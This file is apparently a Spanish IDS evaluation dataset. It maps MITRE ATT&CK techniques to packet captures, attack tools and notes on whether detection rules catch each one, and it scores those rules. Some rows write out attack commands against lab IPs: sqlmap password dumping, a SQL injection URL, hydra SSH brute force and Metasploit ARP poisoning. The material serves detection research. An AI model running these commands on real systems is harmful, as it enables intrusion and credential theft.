Resource Development;-;TA0042;Compromise Infrastructure;T1584.005;Botnet;T1584.005;Uso de Botnet;"""Ares, Screenshot and key logging""";T1584.005-C2018_[6].pcapng;1;1;0;NO;"""La detección debe centrarse en otras fases del ciclo de vida de un ataque, como Phishing, DDoS…""";Uso de Ares y screenshots y key logging https://www.unb.ca/cic/datasets/ids-2018.html;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;Persistence;TA0001;External Remote Services;T1133;-;-;Acceso a red VPN desde dispositivo no autorizado con credenciales robadas;OpenVPN;T1133-External_remote_services_[4].pcapng;1;1;0;NO***;"""Existen varias variantes.
 Circunstancias concretas del ataque: el atacante realiza alguna interacción posterior una vez ha logrado acceder a la red (aplicable a esta técnica) como un escaneo de red o mensajes de anuncio de Host.
 Reglas personalizadas: regla que compruebe si las direcciones IP involucradas en los paquetes se corresponden con las autorizadas dentro de la red VPN (debe ser configurada manualmente).""
";"""Acceso a red VPN, sin interacciones adicionales más allá de las naturales al propio acceso""";Manual [4] / 3.3;Manual [4] / B.3;Manual [4] / 4.3;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Sqlmap;T1190-Sql_inyection1_[3].pcapng;1;1;0;SI;"""Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.""";"""Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords""";Manual [3] / 3.8.5;Manual [3] / 3.8.5.4;Manual [3] / 3.8.5.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Sqlmap;T1190-Sql_inyection2_[2].pcapng;1;76;0;SI;Regla que detecte un posible intento al esquema de informacion de un servidor MySQL. Regla que detecte una sentencia SQL pudiendose tratar de una posible inyeccion SQL. Regla que detecte posible escaneo de vulnerabilidades de inyeccion SQL.;Ejecucion de comando mediante sqlmap para probar diferentes SQL Injections a una página web. Comando: sqlmap -u http://192.168.2.2/payroll_app.php --forms --batch --passwords;Manual [2] / 3.1.3.1;Manual [4] / B.28;Manual [2] / 4.1.1.2;1;1;0;1;0;1;76;1.00;76;1.00;76;1.00;76;1.00;"""FG - Las dos primeras inyecciones SQL generan una alerta, el resto 2""";76;1.00;1
Initial Access;-;TA0001;Exploit Public-Facing Application;T1190;-;-;Inyección SQL;Damn Vulnerable Web App (DVWA);T1190-Sql_injection-C2018_[6].pcapng;1;1;0;NO*;Regla personalizada que detecte posibles cadenas asociadas a un ataque de inyección SQL en sentencias HTML;-;Dataset CIC-2018;Manual [4] / B.34;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Drive-by Compromise;T1189;-;-;HTML Exploit I - HTML Compilador;"""Apache, Shadyantra""";T1189-Drive-by_compromise_v1_[4].pcapng;1;1;0;NO**;"""La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el foco está fijado en la obtención de credenciales, si el ataque está elaborado resulta prácticamente imposible su detección. En caso de que se busque un acceso a la red de manera directa mediante ejecutables y/o malware, el tipo de contenido marcará su grado de detección.""";Carga de página web con exploit HTML para compilar código malware (no ejecutar);Manual [4] / 3.4;Manual [4] / B.4;Manual [4] / 4.4;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;1;1.00;1
Initial Access;-;TA0001;Drive-by Compromise;T1189;-;-;HTML Exploit II - Descarga de Ejecutable;"""Apache, Shadyantra""";T1189-Drive-by_compromise_v2_[4].pcapng;1;1;0;NO**;"""La detección de esta técnica será más o menos viable dependiendo del objetivo y método del atacante. Si el foco está fijado en la obtención de credenciales, si el ataque está elaborado resulta prácticamente imposible su detección. En caso de que se busque un acceso a la red de manera directa mediante ejecutables y/o malware, el tipo de contenido marcará su grado de detección.""";Carga de página web con exploit HTML para descargar malware en formato ejecutable .exe;Manual [4] / 3.4;Manual [4] / B.4;Manual [4] / 4.4;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Initial Access;-;TA0001;Hardware Additions;T1200;-;-;Añadir hardware;SSH Server + USB(Simular USB con MV con SO);T1200-Hardware_Additions_[5].pcapng;1;1;0;NO;"""Detección por anomalías que identifique desviaciones en el tráfico de red, tales como metadatos o protocolos de gestión (DHCP,...) fuera de los habituales""";"""Aparición de una nueva MV en el entorno de la víctima simulando la insercion de un USB tipo Pwn Plug que se utiliza como nodo de acceso a la red de la víctima para posteriormente, aprovechando que el puerto de la víctima esta abierto, acceder al equipo.""";Manual [5] / 3.5.2.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;-;TA0001;Phishing;T1566;Spearphishing Attachment;T1566.001;Envío de emails con documentos maliciosos;-;T1566.001-C2018_[6].pcapng;1;1;0;NO*;"""Si los mensajes contienen determinados patrones como intentos de creación de Shells remotos sí que pueden ser detectados porl los cortafuegos en base a reglas que detecten cadenas específicas en los paquetes""";-;Dataset CIC-2018;Dataset CIC-2018;Dataset CIC-2018;1;1;0;1;0;0;1;1.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Initial Access;-;TA0001;Phishing;T1566;Spearphishing Link;T1566.002;Obtener un acceso inicial mediante ingeniería social utilizando un enlace adjunto en un correo que descargue un fichero que establezca una sesión al equipo víctima;"""SEToolKit, Metasploit""";T1566.002-Spearphishing_Link_[5].pcapng;1;1;0;NO;"""Detección por listas negras/anomalías que permitan detectar tráfico de red correspondiente a correos electrónicos con enlaces maliciosos que contengan contenido malware""";"""Servidor de correo mediante Postfix, Thunderbird, Bind, Dovecot""";Manual [5] / 3.5.2.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;Command and Control;TA0001;Content Injection;T1659;-;-;"""Realizar una suplantación de identidad DHCP, saturando el servidor DHCP verdadero para que el servidor DHCP del atacante procese las consultas de un usuario. Posteriormente se manipula alguna consulta inyectando contenido malicioso""";"""dhcpstarv, Metasploit""";T1659-Content_Injection_[5].pcapng;1;1;0;SI;"""La detección de esta técnica será más o menos viales dependiendo del objetivo y método del atacante. Si el ataque se realiza en conjunto con protocolos de gestion(DHCP) dificultará la detección. Resultará necesario monitorizar por la distribución a traves del tráfico de red de archivos malware""";Suplantacion de identidad de DHCP Server para posteriormente inyectar contenido en la víctima con malware;Manual [5] / 3.5.2.3;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Initial Access;Command and Control;TA0001;Content Injection;T1659;-;-;Inyección;Suite aircrack-ng;T1659_Inyeccion_[1].pcapng;1;1;0;NO;"""Detección por anomalías, paquetes sospechosos de haber sido generados aleatoriamente y sin correlación con las comunicaciones establecidas.""";-;Manual [1] / 2.5.1.1.4;Manual [1] / E.23;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Initial Access;-;TA0001;Trusted Relationship;T1199;-;-;Uso de una conexión RDP sin proteger para el acceso a un equipo;RDP;T1199-Trusted_relationship_[4].pcapng;1;1;0;SI*;"""El ataque tiene un matiz clave. Si bien el ataque puede ser detectado por Snort (existen muchas variantes, aunque para esta instancia concreta, por ejemplo, sí que existe mecanismo de detección), el hecho de que se trate de un ataque procedente de un dominio de confianza infectado, dificulta su detección, pues bloquear estos paquetes podría imposibilitar comunicación con el dominio de confianza si no existiera amenaza""";-;Manual [4] / 3.5;Manual [4] / B.5;Manual [4] / 4.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Persistence;-;TA0003;Browser Extensions;T1176;-;-;Instalación de Plugin en Navegador Chrome que reenvía información relacionada con búsquedas del usuario a un servidor;Malicious-Browser-Extension;T1176-Browser-extension_[4].pcapng;1;1;0;NO;"""Detección por anomalías basada en flujos de datos hacia direcciones no relacionadas con las búsquedas, normalmente en formato de objetos JavaScript""";-;Manual [4] / 3.7;Manual [4] / B.7;Manual [4] / 4.7;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Persistence;Defense Evasion;TA0003;BITS Jobs;T1197;-;-;Establecimiento de tarea BITS en equipo Windows para garantizar persistencia trás reinicio del equipo;"""BITSADMIN,METASPLOIT""";T1197-BITS_Jobs_[5].pcapng;1;1;0;NO**;Se pueden monitorizar conexiones nuevas generadas por BITS;Ejecución de comandos para la creación de una tarea BITS con rastro de red;Manual [5] / 3.5.3.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Persistence;Defense Evasion;TA0003;Pre-OS Boot;T1542;TFTP Boot;T1542.005;Modificación de imagen de SO mediante la suplantación de un Server TFTP;SSH;T1542.005-TFTP_Boot_[5].pcapng;1;1;0;NO***;**Regla personalizada que comprueba si la IP del servidor TFTP es la del servidor legítimo ** Que el SO enviado por el atacante contenga algun tipo de malware detectable por un IDS;Servidor TFTP utilizando Iventoy;Manual [5] / 3.5.3.2;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Persistence;-;TA0003;Server Software Component;T1505;SQL Stored Procedures;T1505.001;Inyección SQL;None (SQL injection using URL);T1505.001-SQL_inyection_[].pcapng;1;1;0;NO***;"**Regla genérica que detecte en la petición ""%27"" que indica la representacion de comillas simples";"Ejecución de URL en navegador web (http://172.16.2.2:8080/contacto?apellidos=Fernandez%27;%20INSERT%20INTO%20contactos%20values%20(3,%20%27Atacante%27,%20%27Atacante%27,%20%27Atacante%27,%20100)--)";Manual [3] / 3.8.7;Manual [3] / 3.8.7.4;Manual [3] / 3.8.7.5;1;1;0;1;0;1;0;0.00;1;1.00;1;1.00;1;1.00;-;1;1.00;1
Persistence;-;TA0003;Server Software Component;T1505;Web Shell;T1505.003;Shell Web;Metasploit;T1505.005-Shell_Web_[2].pcapng;1;1;0;SI;Regla genérica que detecta el intento de escaneo para comprobar la existencia de backdoor.;"El ataque busca aprovechar configuracion vulnerable de un servidor WampServer que permite subir y borrar contenido web mediante el uso de HTTP PUT y HTTP DELETE.
Se realiza la subida de un payload a un servidor web";Manual [2] / 3.1.5.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);Hydra;T1110.001-Hydra_[3].pcapng;1;1;0;NO;-;Obtener la contraseña para conectarse por SSH al equipo victima mediante fuerza bruta. Comando: hydra -l dit -P pass.txt 172.16.2.2 -t 4 ssh;Manual [3] / 3.8.9;Manual [3] / 3.8.9.4;Manual [3] / 3.8.9.5;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);FTP - Patator;T1110.001-FTP-C2018_[6].pcapng;1;1;0;SI;Regla genérica que detecte un elevado número de intentos de acceso a un servicio;-;Dataset CIC-2018;Manual [4] / B.32;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Obtención de contraseña por fuerza bruta (adivinación);SSH - Patator;T1110.001-SSH-C2018_[6].pcapng;1;1;0;SI;Regla genérica que detecte un elevado número de intentos de acceso a un servicio;-;Dataset CIC-2018;Manual [4] / B.33;Dataset CIC-2018;1;1;0;1;0;1;0;0.00;0;0.00;1;1.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Brute Force;T1110;Password Guessing;T1110.001;Ataque sobre WPS;"""wash, reaver""";T1110-Wps_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.8;Manual [1] / E.27;Manual [4] / 4.1.34;1;0;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Spraying;T1110.003;Ataque de fuerza bruta basado en diccionario de contraseñas;wifite;T1110-Diccionario_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.7;Manual [1] / E.26;Manual [4] / 4.2.31;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Cracking;T1110.002;Ataque PMKID;"""hashcat, hcxpcapngtool, hcxdumptool""";T1110-pmkid_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.6.3;Manual [1] / E.25;Manual [4] / 4.2.32;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;-;TA0006;Brute Force;T1110;Password Cracking;T1110.002;PTW/KoreK/FMS;Suite aircrack-ng;T1110-Ptw_korek_[1].pcapng;1;1;0;NO;-;-;Manual [1] / 4.2.5;Manual [1] / E.24;Manual [4] / 4.1.33;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Falsa autenticación;Suite aircrack-ng;T1040-Autenticacion_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.1;Manual [1] / E.20;Manual [4] / 4.1.26;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Acess;Discovery;TA0006;Network Sniffing;T1040;-;-;ChopChop;Suite aircrack-ng;T1040-Chopchop_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.2;Manual [1] / E.21;Manual [4] / 4.1.27;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Fragmentación;Suite aircrack-ng;T1040-Fragmentacion_[1].pcapng;1;1;0;NO;No existe detección posible ante este tipo de ataques. El uso de cifrado WEP incorpora vulnerabilidades intrínsecas a este.;-;Manual [1] / 4.2.3;Manual [1] / E.22;Manual [4] / 4.1.28;1;0;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Discovery;TA0006;Network Sniffing;T1040;-;-;Inundación MAC;Suite aircrack-ng;T1040-Mac_flood_[1].pcapng;1;1;0;NO*;"""Regla personalizada que detecte un envío masivo de mensajes IPv4 con direcciones incorreladas con la red a proteger, y que aparenten ser completamente aleatorias""";-;Manual [1] / 3.2;Manual [1] / E.1;Manual [4] / 4.1.29;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Envenenamiento ARP;Arpspoof;T1557.002-ARP_poisoning1_[2].pcapng;1;1;0;NO;-;Envenenamiento de tablas ARP mediante Arpspoof.;Manual [2] / 3.4.1.1;Manual [2];-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Envenenamiento ARP;Metasploit;T1557.002-ARP_poisoning2_[3].pcapng;1;1;0;NO;-;"""Se realiza un ataque MITM, mediante el envenanamiento de las tablas de ARP caché de un equipo y su gateway. De esta toda se redirige todo el tráfico para que pase a través del equipo del atacante. Comando: msfconsole -x ""use auxiliary/spoof/arp/arp_poisoning; set BIDIRECTIONAL true; set interface eth1; set DHOSTS 192.168.1.2; set SHOSTS 192.168.1.1; run -j -z; sleep 5; kill 0; exit""""";Manual [3] / 3.8.19;Manual [3] / 3.8.19;Manual [3] / 3.8.19.5;1;1;0;1;1;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Suplantación ARP;arpspoof;T1557-Arp_spoof_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 3.2;Manual [1] / E.3;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;DHCP Spoofing;T1557.003;DHCP Spoofing;"""DHCPig, servidor DHCP""";T1557-Dhcp_spoofing_[1].pcapng;1;1;0;SI;"""Regla genérica que detecte un envío masivo de procedimientos DHCP completos (DISCOVERY, OFFER, REQUEST, ACK). Otra alternativa es una regla personalizada que analice mensajes DHCP ACK con direcciones IP de servidores DNS distinta a la establecida en la red""";-;Manual [1] / 2.4.2.1.2;Manual [1] / E.19;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;ARP Cache Poisoning;T1557.002;Agujero 196;ettercap;T1557-Hole196_[1].pcapng;1;1;0;SI;"""Mediante el uso de preprocesadores, la detección de este ataque es posible estableciendo un asociación entre la IP a proteger y su dirección MAC correspondiente. De esta forma, se puede fundar una regla que detecte mensajes ARP que incumplen esta asociación y que avistan de un posible ataque por suplantación MAC""";-;Manual [1] / 2.1.2.1.1;Manual [1] / E.28;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;-;-;Suplantación del puente raíz;yersinia;T1557-Puente_raiz_[1].pcapng;1;1;0;NO**;"""Si el ataque viene seguido de suplantaciones ARP, con el uso de preprocesadores de Snort resulta posible su detección. En caso de que el ataque se centre únicamente en el establecimiento del atacante como puente raíz, no existe mecanismo de detección""";Establecimiento de atacante como puente raíz;Manual [1] / 2.1.4.1.2;Manual [1] / E.6;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Credential Access;Collection;TA0006;Adversary-in-the-Middle;T1557;-;-;Redirección;"""ettercap, netwox""";T1557-Redireccion_[1].pcapng;1;1;0;NO**;Regla personalizada que detecte envío de paquetes ICMP Redirect por parte de un equipo que no debería intervenir en labores de redirección;-;Manual [1] / 2.2.2.1.3;Manual [1] / E.8;-;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;1;1.00;-;0;0.00;1
Credential Access;-;TA0006;Forced Authentication;T1187;-;-;Forzar intento de autenticación en un servidor para obtener credenciales de acceso;"""SMB, NTLMssp-Extract""";"""T1187-Forced_Authentication_[5].pcapng, T1187-Forced_Authentication2_[5].pcapng""";1;3;0;SI;"""Monitorizar tráfico SMB en puertos TCP 139,445, puerto UDP 137 y tráfico WebDAV""";Servidor SMB. El atacante captura el tráfico de red del intento de autenticación mediante Wireshark y aplica fuerza bruta a las credenciales capturadas;Manual [5] / 3.5.5.1;Manual [5];;1;1;0;1;0;1;0;0.00;0;0.00;3;1.00;3;1.00;Cada instancia de ataque se corresponde con una solicitud al server SMB con el usuario y contraseñas en el paquete;0;0.00;1
Credential Access;-;TA0006;OS Credential Dumping;T1003;DCSync;T1003.006;Obtención de credenciales del usuario krbtgt (Usuario Kerberos Active Directory);mimikazt;T1003-Os_credential_dumping_dcsync_[4].pcapng;1;1;0;SI;Regla compuesta que detecte una llamada DCERPC Bind a la API DRSUAPI seguida de una llamada a la función DsGetNCChanges;-;Manual [4] / 3.11;Manual [4] / B.11;Manual [4] / 4.11;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;1
Collection;-;TA0009;Data from Configuration Repository;T1602;SNMP (MIB Dump);T1602.001;Recogida MIB de un equipamiento;Metasploit;T1602.001-MIB_Dump_[2].pcapng;1;1;0;SI;Regla genérica que detecte el uso del protocolo SNMP sobre UDP para acceder a la comunidad public;"""Este ataque obtiene informacion de la MIB de un equipo mediante peticiones SNMP. Comando: msfconsole -x ""use auxiliary/scanner/snmp/snmp_enum; set RHOSTS 192.168.2.2; run; exit""""";Manual [2] / 3.1.8.1;Manual [2];Manual [2] / 4.2.1.10;1;1;0;1;0;1;1;1.00;1;1.00;1;1.00;1;1.00;-;0;0.00;1
Collection;-;TA0009;Data from Information Repositories;T1213;-;-;Inyección SQL;Sqlmap;T1213-SQL_inyection_[3].pcapng;1;1;0;NO;-;Robar informacion de la victima obteniendo el contenido guardado en una tabla SQL. Comando: SELECT * FROM tabla;Manual [3] / 3.8.6;Manual [3] / 3.8.6.4;Manual [3] / 3.8.6.5;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
Collection;-;TA0009;Data from Network Shared Drive;T1039;-;-;Descarga de archivos de interés disponibles en una red compartida;Comando Net Use;T1039-Data_from_network_shared_drive_[4].pcapng;1;1;0;NO;"""Detección por anomalías, copia repentina de ficheros compartidos por red.""";-;Manual [4] / 3.15;Manual [4] / B.15;Manual [4] / 4.15;1;1;0;1;0;1;0;0.00;0;0.00;0;0.00;0;0.00;-;0;0.00;0
